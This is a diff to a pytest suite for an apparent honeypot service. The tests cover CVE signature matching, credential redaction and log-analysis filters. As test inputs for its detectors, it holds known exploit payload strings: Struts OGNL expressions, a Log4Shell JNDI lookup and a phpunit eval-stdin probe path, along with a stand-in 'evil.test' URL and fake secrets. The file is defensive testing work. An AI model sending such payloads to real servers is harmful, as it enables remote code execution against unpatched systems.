@@ -224,7 +224,7 @@ def test_struts_s2_057_signatures_fire():
     for payload in ["redirect:${233*233}", "redirectAction:${233*233}",
                     "${@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}"]:
         hit = any(cve == "CVE-2018-11776" and pat.search(payload)
-                  for cve, pat, _, _ in signatures.CVE_SIGNATURES)
+                  for cve, pat, _, _, _ in signatures.CVE_SIGNATURES)
         assert hit, f"S2-057 pattern still misses: {payload}"
     print("  CVE-2018-11776 matches all 3 real-world payload shapes")
 
@@ -234,7 +234,7 @@ def test_duplicate_header_payload_is_scanned():
     raw = [["referer", "harmless"], ["referer", "${jndi:ldap://x/a}"]]
     text = main._headers_haystack(raw)
     hit = any(cve == "CVE-2021-44228" and pat.search(text)
-              for cve, pat, _, _ in signatures.CVE_SIGNATURES)
+              for cve, pat, _, _, _ in signatures.CVE_SIGNATURES)
     assert hit, "payload in a duplicate header's 2nd occurrence still missed"
     print("  Log4Shell in duplicate header now scanned")
 
@@ -471,8 +471,10 @@ def test_fixture_demonstrates_retroactive_detection():
     expected = (REPO_ROOT / "fixtures" / "expected_analysis.txt").read_text()
     live = expected.split("LIVE")[1].split("RESCAN")[0]
     rescan = expected.split("RESCAN")[1]
-    live_cves = {ln.split()[0] for ln in live.splitlines() if ln.startswith("   CVE-")}
-    rescan_cves = {ln.split()[0] for ln in rescan.splitlines() if ln.startswith("   CVE-")}
+    def ids(section):
+        return {ln.split()[0] for ln in section.splitlines()
+                if ln.strip().startswith("CVE-")}
+    live_cves, rescan_cves = ids(live), ids(rescan)
     assert live_cves < rescan_cves, "fixture no longer shows a retroactive gap"
     # CVE-2025-55182's signature ships after the traffic it matches, which is
     # the situation FINDINGS.md's caveats exist to make an operator check for.
@@ -507,6 +509,201 @@ def test_analyzer_truncates_third_party_ips_by_default():
 def test_analyzer_excludes_self_test_traffic():
     fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
     out = run_analyze(str(fixture), "--exclude-ip", "198.51.100.10").stdout
-    # 3 request records plus the reuse event recorded for that IP.
-    assert "excluded: 4 by --exclude-ip" in out, out[:400]
+    # Request records, the issuances made to that address, and its reuse event.
+    assert "excluded: 7 by --exclude-ip" in out, out[:400]
     print("  self-test exclusion is a documented flag, not a manual step")
+
+
+# --------------------------------------------------------------------------- #
+# Credential redaction across body formats. The first fix moved redaction into
+# the middleware but the parser handled only flat form-encoded and flat
+# top-level JSON, so nested JSON, arrays, XML, multipart and query strings all
+# still wrote the secret verbatim while the docs claimed otherwise.
+# --------------------------------------------------------------------------- #
+_MULTIPART = ("--X\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nv7\r\n"
+              "--X\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n"
+              "MultiSecret9\r\n--X--\r\n")
+
+CREDENTIAL_SHAPES = [
+    ("flat form", "POST", "/login", "username=v1&password=FlatSecret1",
+     "application/x-www-form-urlencoded", "FlatSecret1"),
+    ("flat json", "POST", "/a0", '{"username":"v0","password":"FlatJson0"}',
+     "application/json", "FlatJson0"),
+    ("nested json", "POST", "/a1", '{"auth":{"username":"v2","password":"Hunter2Real"}}',
+     "application/json", "Hunter2Real"),
+    ("deeply nested json", "POST", "/a2", '{"a":{"b":{"c":{"password":"DeepSecret4"}}}}',
+     "application/json", "DeepSecret4"),
+    ("json array", "POST", "/a3", '[{"username":"v3","password":"ArraySecret1"}]',
+     "application/json", "ArraySecret1"),
+    ("xml body", "POST", "/soap", "<login><password>XmlSecret123</password></login>",
+     "application/xml", "XmlSecret123"),
+    ("yaml-ish body", "POST", "/cfg", "user: v5\npassword: YamlSecret7\n",
+     "text/plain", "YamlSecret7"),
+    ("multipart", "POST", "/panel", _MULTIPART,
+     "multipart/form-data; boundary=X", "MultiSecret9"),
+    ("query string on GET", "GET", "/q?username=v6&password=QuerySecret42", None,
+     None, "QuerySecret42"),
+    ("query string on POST", "POST", "/q2?pass=QpSecret8", "unrelated=1",
+     "application/x-www-form-urlencoded", "QpSecret8"),
+]
+
+
+@pytest.mark.parametrize("label,method,path,body,ctype,secret", CREDENTIAL_SHAPES,
+                         ids=[c[0] for c in CREDENTIAL_SHAPES])
+def test_credentials_never_retained_in_any_shape(label, method, path, body, ctype, secret):
+    import main
+    c = TestClient(main.app)
+    c.request(method, path, content=body, headers={"content-type": ctype} if ctype else {})
+    rec = events("request")[-1]
+    assert secret not in json.dumps(rec), f"{label}: secret written to the log"
+    assert rec.get("creds_submitted", {}).get("pass_present") is True, \
+        f"{label}: credential submission not recorded at all"
+
+
+def test_query_string_credentials_are_redacted_in_the_query_field():
+    """rec["query"] is its own field; redacting body_excerpt alone left it exposed."""
+    import main
+    c = TestClient(main.app)
+    c.get("/q?username=v&password=QueryFieldSecret1")
+    rec = events("request")[-1]
+    assert "QueryFieldSecret1" not in rec["query"], rec["query"]
+    assert "<redacted:len=17>" in rec["query"], rec["query"]
+    assert "username=v" in rec["query"], "non-credential params should survive"
+    print("  query credentials redacted, other params preserved")
+
+
+def test_ordinary_body_is_not_over_redacted():
+    """Over-redaction is the safer failure, but it still must not swallow everything."""
+    import main
+    c = TestClient(main.app)
+    c.post("/plain", content="hello=world&page=2",
+           headers={"content-type": "application/x-www-form-urlencoded"})
+    rec = events("request")[-1]
+    assert rec["body_excerpt"] == "hello=world&page=2"
+    assert "creds_submitted" not in rec
+    c.get("/search?q=how+to+reset+a+password")
+    rec = events("request")[-1]
+    assert "how+to+reset+a+password" in rec["query"], "a query merely mentioning a field name"
+    print("  non-credential bodies and queries pass through intact")
+
+
+# --------------------------------------------------------------------------- #
+# Provenance, classification, canary state, and report sanitization.
+# --------------------------------------------------------------------------- #
+def test_every_record_carries_the_collection_window():
+    """Derived events were unlabelled, so --window silently kept all of them."""
+    import main
+    c = TestClient(main.app)
+    c.get("/.env")
+    c.get("/x/ffffffffffffffff")
+    kinds = {e["event"] for e in events()}
+    assert {"request", "honeytoken_issued", "catcher_probe_unissued"} <= kinds
+    unlabelled = [e for e in events() if "window" not in e]
+    assert not unlabelled, f"records without a window: {[e['event'] for e in unlabelled]}"
+    print(f"  all {len(kinds)} event kinds carry a window label")
+
+
+def test_issuances_carry_ip_so_exclusions_reach_them():
+    """--exclude-ip could not match an issuance: the address was packed in `session`."""
+    import main
+    c = TestClient(main.app)
+    c.get("/.env", headers={"x-forwarded-for": "203.0.113.55"})
+    issued = events("honeytoken_issued")[-1]
+    assert issued["ip"] == "203.0.113.55", issued
+    assert issued["session"].startswith("203.0.113.55|")
+    print("  issuance records carry ip separately from session")
+
+
+def test_signatures_declare_exploit_or_probe():
+    """A path hit is reconnaissance; counting it as exploitation inflates the headline."""
+    import signatures
+    kinds = {cve: kind for cve, _p, _w, _s, kind in signatures.CVE_SIGNATURES}
+    assert set(kinds.values()) <= {"exploit", "probe"}
+    # Path-only detectors cannot see a payload, so they cannot evidence exploitation.
+    for cve, _p, where, _s, kind in signatures.CVE_SIGNATURES:
+        if where == "path" and cve in ("CVE-2017-9841", "CVE-2024-27956"):
+            assert kind == "probe", f"{cve} is path-only and must not count as an exploit"
+    assert kinds["CVE-2021-44228"] == "exploit"
+    assert kinds["CVE-2025-55182"] == "exploit"
+    print(f"  {sum(v == 'exploit' for v in kinds.values())} exploit, "
+          f"{sum(v == 'probe' for v in kinds.values())} probe signatures")
+
+
+def test_cve_events_record_kind_and_body_presence():
+    import main
+    c = TestClient(main.app)
+    c.get("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
+    hit = [e for e in events("cve_pattern_match") if e["cve_id"] == "CVE-2017-9841"][-1]
+    assert hit["signature_kind"] == "probe" and hit["body_present"] is False
+    print("  a bare path hit is recorded as a probe with no body")
+
+
+def test_analyzer_separates_exploits_from_probes():
+    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
+    out = run_analyze(str(fixture), "--rescan").stdout
+    assert "payload-bearing exploit attempts" in out
+    assert "vulnerability probes (path/marker only)" in out
+    rescan = out.split("RESCAN")[1]
+    exploit_line = [l for l in rescan.splitlines() if "payload-bearing" in l][0]
+    probe_line = [l for l in rescan.splitlines() if "vulnerability probes" in l][0]
+    assert "3 hit(s)" in exploit_line, exploit_line
+    assert "2 hit(s)" in probe_line, probe_line
+    print("  rescan reports 3 exploit attempts and 2 probes rather than a combined 5")
+
+
+def test_window_filter_reaches_derived_events():
+    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
+    out = run_analyze(str(fixture), "--window", "nonexistent").stdout
+    assert "honeytoken_issued: 0" in out, out[:600]
+    assert "confirmed triggers (issued ids only): 0" in out
+    assert "runtime reuse events recorded by the service: 0" in out
+    print("  a window that matches nothing yields nothing, derived events included")
+
+
+def test_exclude_ip_reaches_issuances_and_reuse():
+    fixture = REPO_ROOT / "fixtures" / "sample_events.jsonl"
+    out = run_analyze(str(fixture), "--exclude-ip", "198.51.100.10").stdout
+    assert "circumstantial reuse hits (issued value reappearing later elsewhere): 0" in out
+    assert "honeytoken_issued: 1" in out, out[:600]
+    print("  excluding a self-test address drops its issuances and its reuse hit")
+
+
+def test_analyzer_does_not_print_raw_payloads_by_default():
+    import main, tempfile
+    with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as fh:
+        fh.write(json.dumps({
+            "ts": "2026-07-20T00:00:00+00:00", "event": "request", "window": "w",
+            "ip": "203.0.113.9", "ua": "curl key=SuperSecretValue1 https://evil.test/x",
+            "method": "GET", "path": "/probe?apikey=AKIAEXAMPLESECRETKEY99",
+            "query": "", "headers": {}, "status_served": 404, "route_kind": "catch-all",
+            "body_len": 0, "body_excerpt": "",
+        }) + "\n")
+        path = fh.name
+    out = run_analyze(path).stdout
+    for leak in ("SuperSecretValue1", "https://evil.test/x", "AKIAEXAMPLESECRETKEY99"):
+        assert leak not in out, f"default output leaked {leak!r}"
+    raw = run_analyze(path, "--show-payloads").stdout
+    assert "AKIAEXAMPLESECRETKEY99" in raw, "--show-payloads should restore raw text"
+    print("  default report is paste-safe; --show-payloads opts back in")
+
+
+def test_ipv6_truncation_is_valid():
+    analyze = _import_analyze()
+    analyze.ARGS.full_ips = False
+    assert analyze.truncate_ip("2001:db8::1") == "2001:db8::/48"
+    assert analyze.truncate_ip("2001:db8:85a3::8a2e:370:7334") == "2001:db8:85a3::/48"
+    assert analyze.truncate_ip("198.51.100.10") == "198.51.100.0/24"
+    assert analyze.truncate_ip("not-an-ip") == "<unparseable>"
+    print("  IPv6 anonymization produces valid networks")
+
+
+def test_security_txt_does_not_advertise_an_unmonitored_address():
+    import main
+    c = TestClient(main.app)
+    body = c.get("/.well-known/security.txt").text
+    if main.OPERATOR_CONTACT:
+        assert f"mailto:{main.OPERATOR_CONTACT}" in body
+    else:
+        assert "http-bait.example" not in body, body
+        assert "No operator contact configured" in body, body
+    print("  security.txt says it is unconfigured rather than naming a dead mailbox")
